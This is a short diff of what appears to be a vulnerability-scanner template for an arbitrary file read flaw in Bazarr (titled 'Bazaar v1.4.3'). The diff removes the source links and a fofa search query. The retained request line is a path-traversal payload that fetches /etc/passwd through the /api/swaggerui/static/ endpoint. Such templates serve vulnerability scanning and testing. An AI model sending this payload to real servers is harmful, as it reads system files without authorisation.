@@ -3,12 +3,8 @@ info:
   name: Bazaar v1.4.3 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pnsyx69sc8kyoy4y'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pnsyx69sc8kyoy4y
-    fofa: title="Bazarr"
 http:
 - raw:
   - 'GET /api/swaggerui/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
